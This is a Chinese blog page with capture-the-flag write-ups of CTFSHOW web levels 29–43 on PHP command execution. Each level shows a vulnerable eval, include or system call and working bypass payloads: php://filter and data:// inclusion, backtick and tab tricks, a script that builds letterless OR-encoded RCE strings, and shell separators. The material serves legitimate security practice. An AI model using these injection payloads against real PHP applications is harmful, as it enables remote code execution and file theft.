@@ -1,0 +1,2086 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="CTFSHOW-命令执行, marin的小窝">
+    <meta name="description" content="命令执行web 29
+命令执行，需要严格的过滤
+
+简单的绕过
+&amp;lt;?php
+if(isset($_GET[&amp;#39;c&amp;#39;]))&amp;#123;
+    $c &amp;#x3D; $_GET[&amp;#39;c&amp;#39;];
+    if(!pr">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>CTFSHOW-命令执行 | marin的小窝</title>
+    <link rel="icon" type="image/jpeg" href="/favicon.jpg">
+    
+
+
+    <!-- bg-cover style     -->
+
+
+
+<link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+<link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+<link rel="stylesheet" type="text/css" href="/css/matery.css">
+<link rel="stylesheet" type="text/css" href="/css/my.css">
+<link rel="stylesheet" type="text/css" href="/css/dark.css" media="none" onload="if(media!='all')media='all'">
+
+
+
+
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+    <link rel="stylesheet" href="/css/post.css">
+
+
+
+
+    
+        <link rel="stylesheet" type="text/css" href="/css/reward.css">
+    
+
+
+
+    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>
+
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">marin的小窝</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>主页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>类型</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于我</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友链</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+  <li>
+    <a href="javascript:;" class="waves-effect waves-light" onclick="switchNightMode()" title="深色/浅色模式" >
+      <i id="sum-moon-icon" class="fas fa-sun" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">marin的小窝</div>
+        <div class="logo-desc">
+            
+            一个学习网安的小菜鸡
+            
+        </div>
+    </div>
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			主页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			类型
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于我
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友链
+		</a>
+          
+        </li>
+        
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/20240312_124030.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">CTFSHOW-命令执行</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/web/">
+                                <span class="chip bg-color">web</span>
+                            </a>
+                        
+                            <a href="/tags/%E5%88%B7%E9%A2%98/">
+                                <span class="chip bg-color">刷题</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/CTFSHOW/" class="post-category">
+                                CTFSHOW
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2025-05-15
+                </div>
+                
+
+                
+
+                
+
+                
+
+                
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.css">
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><h3 id="web-29"><a href="#web-29" class="headerlink" title="web 29"></a>web 29</h3><blockquote>
+<p><code>命令执行，需要严格的过滤</code></p>
+</blockquote>
+<p>简单的绕过</p>
+<pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">&lt;?php
+if(isset($_GET[&#39;c&#39;]))&#123;
+    $c &#x3D; $_GET[&#39;c&#39;];
+    if(!preg_match(&quot;&#x2F;flag&#x2F;i&quot;, $c))&#123;
+        eval($c);
+    &#125;
+    
+&#125;else&#123;
+    highlight_file(__FILE__);
+&#125;</code></pre>
+
+<p>先看一下有什么东西</p>
+<pre class="line-numbers language-none" data-start="1"><code class="language-none">?c&#x3D;System(&#39;ls&#39;);</code></pre>
+
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250516101315-20260228215612-0a018dc.png" alt="image"></p>
+<p>然后绕过一下就行</p>
+<pre class="line-numbers language-none" data-start="1"><code class="language-none">?c&#x3D;System(&#39;cat f*&#39;);</code></pre>
+
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250516101404-20260228215612-6vw17wk.png" alt="image"></p>
+<p>hint还有一种解法</p>
+<pre class="line-numbers language-none" data-start="1"><code class="language-none">?c&#x3D;echo &#96;nl fl&#39;&#39;ag.php&#96;;</code></pre>
+
+<blockquote>
+<p>利用 <code>echo ``</code> 来执行命令</p>
+<p><code>nl</code> 命令用来给文件加上行号并输出</p>
+</blockquote>
+<p>‍</p>
+<h3 id="web-30"><a href="#web-30" class="headerlink" title="web 30"></a>web 30</h3><blockquote>
+<p><code>命令执行，需要严格的过滤</code></p>
+</blockquote>
+<p>‍</p>
+<pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">&lt;?php
+error_reporting(0);
+if(isset($_GET[&#39;c&#39;]))&#123;
+    $c &#x3D; $_GET[&#39;c&#39;];
+    if(!preg_match(&quot;&#x2F;flag|system|php&#x2F;i&quot;, $c))&#123;
+        eval($c);
+    &#125;
+    
+&#125;else&#123;
+    highlight_file(__FILE__);
+&#125;</code></pre>
+
+<p>这题直接用上一题 hint 的方法</p>
+<pre class="line-numbers language-none" data-start="1"><code class="language-none">?c&#x3D;echo &#96;ls&#96;;</code></pre>
+
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250516103126-20260228215612-1hofiib.png" alt="image"></p>
+<pre class="line-numbers language-none" data-start="1"><code class="language-none">?c&#x3D;echo &#96;cat fla*&#96;;</code></pre>
+
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250516103204-20260228215612-upv96hf.png" alt="image"></p>
+<p>‍</p>
+<h3 id="web-31"><a href="#web-31" class="headerlink" title="web 31"></a>web 31</h3><blockquote>
+<p><code>命令执行，需要严格的过滤</code></p>
+</blockquote>
+<pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">&lt;?php
+error_reporting(0);
+if(isset($_GET[&#39;c&#39;]))&#123;
+    $c &#x3D; $_GET[&#39;c&#39;];
+    if(!preg_match(&quot;&#x2F;flag|system|php|cat|sort|shell|\.| |\&#39;&#x2F;i&quot;, $c))&#123;
+        eval($c);
+    &#125;
+    
+&#125;else&#123;
+    highlight_file(__FILE__);
+&#125;</code></pre>
+
+<p>这个主要是过滤了空格，绕过一下空格，用 <code>%09</code> 来绕过</p>
+<pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">?c&#x3D;echo%09&#96;ls&#96;;</code></pre>
+
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250516104307-20260228215612-6f0trwx.png" alt="image"></p>
+<pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">?c&#x3D;echo%09&#96;tac%09fla*&#96;;</code></pre>
+
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250516104345-20260228215612-pppij65.png" alt="image"></p>
+<p>这题的hint给了一个方法，记录一下</p>
+<pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">show_source(next(array_reverse(scandir(pos(localeconv())))));</code></pre>
+
+<blockquote>
+<p><code>localeconv()</code>​：这个是获取数字和货币格式化信息的，这个作用没什么用，主要是这个函数会返回一个关联数组，这个数组的第一个值为 <code>.</code>​<br>​<img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250517124534-20260228215613-p97b09n.png" alt="image"></p>
+<p><code>pos()</code>​：是 <code>current()</code>​的别名，获取数组的当前值，也就是 <code>.</code></p>
+<p><code>scandir()</code>​：列出指定路径中的文件和目录，这里就是当前路径<br>​<img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250517160631-20260228215613-tjafsn6.png" alt="image"></p>
+<p><code>array_reverse()</code>​：将数组反转<br>​<img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250517160645-20260228215613-vzb3f7s.png" alt="image"></p>
+<pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">array(4) &#123;
+  [0]&#x3D;&gt;
+  string(9) &quot;index.php&quot;
+  [1]&#x3D;&gt;
+  string(8) &quot;flag.php&quot;
+  [2]&#x3D;&gt;
+  string(2) &quot;..&quot;
+  [3]&#x3D;&gt;
+  string(1) &quot;.&quot;
+&#125;</code></pre>
+
+<p><code>next()</code>：将数组中的指针移动一位，也就是1的值，flag.php</p>
+<p><code>show_resource()</code>：高亮这个文件</p>
+</blockquote>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250517125721-20260228215613-drcsisx.png" alt="image"></p>
+<h3 id="web-32"><a href="#web-32" class="headerlink" title="web 32"></a>web 32</h3><blockquote>
+<p><code>命令执行，需要严格的过滤</code></p>
+</blockquote>
+<pre class="line-numbers language-python" data-language="python" data-start="1"><code class="language-python">&lt;?php
+error_reporting(0);
+if(isset($_GET[&#39;c&#39;]))&#123;
+    $c &#x3D; $_GET[&#39;c&#39;];
+    if(!preg_match(&quot;&#x2F;flag|system|php|cat|sort|shell|\.| |\&#39;|\&#96;|echo|\;|\(&#x2F;i&quot;, $c))&#123;
+        eval($c);
+    &#125;
+    
+&#125;else&#123;
+    highlight_file(__FILE__);
+&#125;</code></pre>
+
+<p>这个过滤了 <code>echo</code>​、<code>``</code>​、<code>;</code>​、<code>(</code>，把很多php的函数都使用不了</p>
+<p>这里学习到了php中一些无需括号就能使用的函数，<code>include</code>​、<code>require</code></p>
+<pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">include&quot;a.php&quot;
+require&quot;b.php&quot;</code></pre>
+
+<p>但是分号这么办呢，这里用的是闭合标签来绕过</p>
+<pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">include&quot;$_GET[1]&quot;?&gt;</code></pre>
+
+<p>有两种paylad，主要是利用了文件包含的漏洞<br>在php中，如果语句只有一行结尾可以不用分号</p>
+<pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">?c&#x3D;include$_GET[&quot;a&quot;]?&gt;&amp;a&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</code></pre>
+
+<pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">?c&#x3D;include&quot;$_GET[1]&quot;?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</code></pre>
+
+<p>或者是利用 <code>php://input</code></p>
+<pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">?c&#x3D;include&quot;$_GET[1]&quot;?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;input</code></pre>
+
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250517122814-20260228215613-zdkong0.png" alt="image"></p>
+<p>‍</p>
+<h3 id="web-33"><a href="#web-33" class="headerlink" title="web 33"></a>web 33</h3><blockquote>
+<p><code>命令执行，需要严格的过滤</code></p>
+</blockquote>
+<pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">&lt;?php
+
+error_reporting(0);
+if(isset($_GET[&#39;c&#39;]))&#123;
+    $c &#x3D; $_GET[&#39;c&#39;];
+    if(!preg_match(&quot;&#x2F;flag|system|php|cat|sort|shell|\.| |\&#39;|\&#96;|echo|\;|\(|\&quot;&#x2F;i&quot;, $c))&#123;
+        eval($c);
+    &#125;
+    
+&#125;else&#123;
+    highlight_file(__FILE__);
+&#125;</code></pre>
+
+<p>多过滤了一个 <code>&quot;&quot;</code>，尝试用上一题的解法做</p>
+<p>一样的</p>
+<pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">?c&#x3D;include$_GET[1]?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</code></pre>
+
+<p>‍</p>
+<h3 id="web-34"><a href="#web-34" class="headerlink" title="web 34"></a>web 34</h3><blockquote>
+<p><code>命令执行，需要严格的过滤</code></p>
+</blockquote>
+<pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">&lt;?php
+
+error_reporting(0);
+if(isset($_GET[&#39;c&#39;]))&#123;
+    $c &#x3D; $_GET[&#39;c&#39;];
+    if(!preg_match(&quot;&#x2F;flag|system|php|cat|sort|shell|\.| |\&#39;|\&#96;|echo|\;|\(|\:|\&quot;&#x2F;i&quot;, $c))&#123;
+        eval($c);
+    &#125;
+    
+&#125;else&#123;
+    highlight_file(__FILE__);
+&#125;</code></pre>
+
+<p>多过滤了 <code>:</code> </p>
+<p>文件包含的还是能用</p>
+<pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">?c&#x3D;include$_GET[1]?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</code></pre>
+
+<p>‍</p>
+<h3 id="web-35"><a href="#web-35" class="headerlink" title="web 35"></a>web 35</h3><blockquote>
+<p><code>命令执行，需要严格的过滤</code></p>
+</blockquote>
+<pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">&lt;?php
+
+error_reporting(0);
+if(isset($_GET[&#39;c&#39;]))&#123;
+    $c &#x3D; $_GET[&#39;c&#39;];
+    if(!preg_match(&quot;&#x2F;flag|system|php|cat|sort|shell|\.| |\&#39;|\&#96;|echo|\;|\(|\:|\&quot;|\&lt;|\&#x3D;&#x2F;i&quot;, $c))&#123;
+        eval($c);
+    &#125;
+    
+&#125;else&#123;
+    highlight_file(__FILE__);
+&#125;</code></pre>
+
+<p>多过滤了 <code>&lt;</code>​ 、<code>=</code> 还是没变</p>
+<p>‍</p>
+<h3 id="web-36"><a href="#web-36" class="headerlink" title="web 36"></a>web 36</h3><blockquote>
+<p><code>命令执行，需要严格的过滤</code></p>
+</blockquote>
+<pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">&lt;?php
+
+error_reporting(0);
+if(isset($_GET[&#39;c&#39;]))&#123;
+    $c &#x3D; $_GET[&#39;c&#39;];
+    if(!preg_match(&quot;&#x2F;flag|system|php|cat|sort|shell|\.| |\&#39;|\&#96;|echo|\;|\(|\:|\&quot;|\&lt;|\&#x3D;|\&#x2F;|[0-9]&#x2F;i&quot;, $c))&#123;
+        eval($c);
+    &#125;
+    
+&#125;else&#123;
+    highlight_file(__FILE__);
+&#125;</code></pre>
+
+<p>加了数字，改一下就行</p>
+<pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">?c&#x3D;include$_GET[a]?&gt;&amp;a&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</code></pre>
+
+<p>‍</p>
+<h3 id="web-37"><a href="#web-37" class="headerlink" title="web 37"></a>web 37</h3><blockquote>
+<p><code>命令执行，需要严格的过滤</code></p>
+</blockquote>
+<pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">&lt;?php
+&#x2F;&#x2F;flag in flag.php
+error_reporting(0);
+if(isset($_GET[&#39;c&#39;]))&#123;
+    $c &#x3D; $_GET[&#39;c&#39;];
+    if(!preg_match(&quot;&#x2F;flag&#x2F;i&quot;, $c))&#123;
+        include($c);
+        echo $flag;
+    
+    &#125;
+        
+&#125;else&#123;
+    highlight_file(__FILE__);
+&#125;</code></pre>
+
+<p>终于有点不一样的了（bushi</p>
+<p>这里有文件包含，可以用伪协议来操作</p>
+<ul>
+<li><p>方法1：</p>
+<pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">&#x2F;?c&#x3D;php:&#x2F;&#x2F;input </code></pre>
+
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250517144505-20260228215613-yun56h3.png" alt="image"></p>
+</li>
+<li><p>方法2：<br>使用data伪协议</p>
+<pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs&#x2F;Pg&#x3D;&#x3D;</code></pre>
+
+<p>base64 加密的就是要使用的命令</p>
+</li>
+</ul>
+<p>‍</p>
+<h3 id="web-38"><a href="#web-38" class="headerlink" title="web 38"></a>web 38</h3><blockquote>
+<p><code>命令执行，需要严格的过滤</code></p>
+</blockquote>
+<pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">&lt;?php
+
+&#x2F;&#x2F;flag in flag.php
+error_reporting(0);
+if(isset($_GET[&#39;c&#39;]))&#123;
+    $c &#x3D; $_GET[&#39;c&#39;];
+    if(!preg_match(&quot;&#x2F;flag|php|file&#x2F;i&quot;, $c))&#123;
+        include($c);
+        echo $flag;
+    
+    &#125;
+        
+&#125;else&#123;
+    highlight_file(__FILE__);
+&#125;</code></pre>
+
+<p>不能使用一些伪协议了，但是data还能使用</p>
+<pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs&#x2F;Pg&#x3D;&#x3D;</code></pre>
+
+<p>‍</p>
+<h3 id="web-40"><a href="#web-40" class="headerlink" title="web 40"></a>web 40</h3><blockquote>
+<p><code>命令执行，需要严格的过滤</code></p>
+</blockquote>
+<pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">&lt;?php
+if(isset($_GET[&#39;c&#39;]))&#123;
+    $c &#x3D; $_GET[&#39;c&#39;];
+    if(!preg_match(&quot;&#x2F;[0-9]|\~|\&#96;|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\&#x3D;|\+|\&#123;|\[|\]|\&#125;|\:|\&#39;|\&quot;|\,|\&lt;|\.|\&gt;|\&#x2F;|\?|\\\\&#x2F;i&quot;, $c))&#123;
+        eval($c);
+    &#125;
+        
+&#125;else&#123;
+    highlight_file(__FILE__);
+&#125;</code></pre>
+
+<p>可以发现他过滤的其实是中文的括号，但是无法读取flag内容</p>
+<pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">system(ls);</code></pre>
+
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250517153942-20260228215613-skd45do.png" alt="image"></p>
+<ul>
+<li><p>方法1：<br>用之前的方法成功了</p>
+<pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">show_source(next(array_reverse(scandir(pos(localeconv())))));</code></pre>
+
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250517154246-20260228215614-qrlbfv2.png" alt="image"></p>
+</li>
+<li><p>方法2：<br>hint 用的是 session 的方法</p>
+<pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">&#x2F;?c&#x3D;session_start();system(session_id());</code></pre>
+
+<blockquote>
+<p><code>session_start()</code>：用来启动 session 会话机制</p>
+<p><code>session_id()</code>：用来获取 session ID 字符串</p>
+</blockquote>
+<p>但是这个方法也是只能用 ls，因为这个 id 也不能用符号<br>​<img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250517155142-20260228215614-izzkj8o.png" alt="image"><br>​<img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250517155214-20260228215614-zigr4os.png" alt="image"></p>
+</li>
+<li><pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">var_dump(current(get_defined_vars()));&amp;a&#x3D;phpinfo();</code></pre>
+
+<blockquote>
+<p><code>get_defined_vars()</code>：返回由所有已定义变量所组成的数组，这里我们要获取 GET 的变量数组</p>
+<p><code>current()</code>：这个数组好像是不一定的，但是这里的第一个就是 GET 数组的内容</p>
+<p><code>var_dump()</code>​：打印出来<br>​<img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250517160227-20260228215614-6spajvt.png" alt="image"></p>
+</blockquote>
+<p>然后可以用 <code>end()</code> 来取出后面的项</p>
+<pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">eval(end(current(get_defined_vars())));&amp;a&#x3D;phpinfo();</code></pre>
+
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250517160402-20260228215614-y7rtp9f.png" alt="image"></p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250517160501-20260228215614-vzsmo8l.png" alt="image"></p>
+</li>
+</ul>
+<p>‍</p>
+<h3 id="web-41"><a href="#web-41" class="headerlink" title="web 41"></a>web 41</h3><blockquote>
+<p><code>过滤不严，命令执行</code></p>
+</blockquote>
+<pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">&lt;?php
+
+if(isset($_POST[&#39;c&#39;]))&#123;
+    $c &#x3D; $_POST[&#39;c&#39;];
+if(!preg_match(&#39;&#x2F;[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-&#x2F;i&#39;, $c))&#123;
+        eval(&quot;echo($c);&quot;);
+    &#125;
+&#125;else&#123;
+    highlight_file(__FILE__);
+&#125;
+?&gt;</code></pre>
+
+<p>看着像无字母rce，但是 <code>^</code>​ 、<code>$</code>​ 和 <code>~</code> 都被过滤了，好像都不行了，看wp学一手</p>
+<p>这里用到的和异或其实挺像的，这里用的是或 <code>|</code></p>
+<p>参考大佬的脚本搓了一个</p>
+<pre class="line-numbers language-python" data-language="python" data-start="1"><code class="language-python">import re
+from urllib.parse import quote
+
+preg &#x3D; &#39;[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-&#39;
+
+def generate_Dict():
+    # 生成字典
+    dict &#x3D; &#123;&#125;
+    for i in range(0, 256):
+        for j in range(0, 256):
+            if not re.match(preg,chr(i),re.I) and not re.match(preg,chr(j),re.I):
+                k &#x3D; i | j
+                if k in range(32,127):
+                    if not k in dict.keys():
+                        dict[chr(k)] &#x3D; [quote(chr(i)), quote(chr(j))]
+    return dict
+
+
+def generate_payload(dicts,payload):
+    s1 &#x3D; &quot;&quot;
+    s2 &#x3D; &quot;&quot;
+    for s in payload:
+        s1 +&#x3D; dicts[s][0]
+        s2 +&#x3D; dicts[s][1]
+    return f&#39;(&quot;&#123;s1&#125;&quot;|&quot;&#123;s2&#125;&quot;)&#39;
+    
+dicts &#x3D; generate_Dict()
+# print(dicts)
+a &#x3D; generate_payload(dicts&#x3D;dicts,payload&#x3D;&quot;System&quot;)
+b &#x3D; generate_payload(dicts&#x3D;dicts,payload&#x3D;&quot;cat flag.php&quot;)
+
+print(a+b)</code></pre>
+
+<pre class="line-numbers language-python" data-language="python" data-start="1"><code class="language-python">c&#x3D;(&quot;%60%60%60%60%60%60&quot;|&quot;%13%19%13%14%25%0D&quot;)(&quot;%60%60%60%20%60%60%60%60.%60%60%60&quot;|&quot;%23%21%14%20%06%2C%21%27.%10%28%10&quot;)</code></pre>
+
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250517164008-20260228215614-cst46l0.png" alt="image"></p>
+<p>‍</p>
+<h3 id="web-42"><a href="#web-42" class="headerlink" title="web 42"></a>web 42</h3><blockquote>
+<p><code>命令执行，需要严格的过滤</code></p>
+</blockquote>
+<pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">&lt;?php
+
+if(isset($_GET[&#39;c&#39;]))&#123;
+    $c&#x3D;$_GET[&#39;c&#39;];
+    system($c.&quot; &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1&quot;);
+&#125;else&#123;
+    highlight_file(__FILE__);
+&#125;</code></pre>
+
+<p>这里命令的结果会被 <code>&gt;/dev/null</code> 抹掉，但是可以通过一些命令分割开来</p>
+<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">ls ;
+ls ||</code></pre>
+
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250517171348-20260228215615-cjhchg6.png" alt="image"></p>
+<p>或者用 <code>%0a</code> 换行符</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250517171447-20260228215615-3j572ma.png" alt="image"></p>
+<p>‍</p>
+<h3 id="web-43"><a href="#web-43" class="headerlink" title="web 43"></a>web 43</h3><blockquote>
+<p><code>命令执行，需要严格的过滤</code></p>
+</blockquote>
+<pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">&lt;?php
+
+if(isset($_GET[&#39;c&#39;]))&#123;
+    $c&#x3D;$_GET[&#39;c&#39;];
+    if(!preg_match(&quot;&#x2F;\;|cat&#x2F;i&quot;, $c))&#123;
+        system($c.&quot; &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1&quot;);
+    &#125;
+&#125;else&#123;
+    highlight_file(__FILE__);
+&#125;</code></pre>
+
+<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">?c&#x3D;tac flag.php||</code></pre>
+
